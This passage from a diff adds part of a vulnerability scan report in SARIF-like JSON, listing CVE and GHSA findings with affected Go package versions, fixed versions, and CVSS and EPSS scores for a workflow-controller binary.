+            "text": "  Vulnerability   : CVE-2024-27289                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:golang/github.com/jackc/pgx@4.18.1#v4                        \n  Affected range  : <4.18.2                                                          \n  Fixed version   : 4.18.2                                                           \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.001820                                                         \n  EPSS Percentile : 0.400950                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-30204",
+          "ruleIndex": 37,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-30204                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4                    \n  Affected range  : <4.5.2                                                           \n  Fixed version   : 4.5.2                                                            \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.000430                                                         \n  EPSS Percentile : 0.120880                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45337",
+          "ruleIndex": 38,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-45337                                \n  Severity        : CRITICAL                                      \n  Package         : pkg:golang/golang.org/x/crypto@0.14.0         \n  Affected range  : <0.31.0                                       \n  Fixed version   : 0.31.0                                        \n  CVSS Score      : 9.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  \n  EPSS Score      : 0.438900                                      \n  EPSS Percentile : 0.974430                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22871",
+          "ruleIndex": 39,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22871            \n  Severity        : CRITICAL                  \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.23.8                   \n  Fixed version   : 1.23.8                    \n  EPSS Score      : 0.000130                  \n  EPSS Percentile : 0.014880                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-41110",
+          "ruleIndex": 40,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-41110                                                   \n  Severity        : CRITICAL                                                         \n  Package         : pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible        \n  Affected range  : >=24.0.0,<25.0.6                                                 \n  Fixed version   : 25.0.6                                                           \n  CVSS Score      : 9.4                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H  \n  EPSS Score      : 0.005620                                                         \n  EPSS Percentile : 0.673500                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24790",
+          "ruleIndex": 41,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24790            \n  Severity        : CRITICAL                  \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.11                  \n  Fixed version   : 1.21.11                   \n  EPSS Score      : 0.000920                  \n  EPSS Percentile : 0.268410                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-27304",
+          "ruleIndex": 34,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-27304                                 \n  Severity        : CRITICAL                                       \n  Package         : pkg:golang/github.com/jackc/pgproto3@2.3.2#v2  \n  Affected range  : <2.3.3                                         \n  Fixed version   : 2.3.3                                          \n  EPSS Score      : 0.002860                                       \n  EPSS Percentile : 0.516480                                       \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-7jwh-3vrq-q3m8",
+          "ruleIndex": 35,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability  : GHSA-7jwh-3vrq-q3m8                           \n  Severity       : CRITICAL                                      \n  Package        : pkg:golang/github.com/jackc/pgx@4.18.1#v4     \n  Affected range : <4.18.2                                       \n  Fixed version  : 4.18.2                                        \n  CVSS Score     : 9.8                                           \n  CVSS Vector    : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-32445",
+          "ruleIndex": 42,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-32445                                    \n  Severity        : CRITICAL                                          \n  Package         : pkg:golang/github.com/argoproj/argo-events@1.7.3  \n  Affected range  : <1.9.6                                            \n  Fixed version   : 1.9.6                                             \n  CVSS Score      : 9.9                                               \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H      \n  EPSS Score      : 0.000820                                          \n  EPSS Percentile : 0.247240                                          \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-hmp7-x699-cvhq",
+          "ruleIndex": 43,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability  : GHSA-hmp7-x699-cvhq                               \n  Severity       : CRITICAL                                          \n  Package        : pkg:golang/github.com/argoproj/argo-events@1.7.3  \n  Affected range : <1.9.6                                            \n  Fixed version  : 1.9.6                                             \n  CVSS Score     : 9.9                                               \n  CVSS Vector    : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
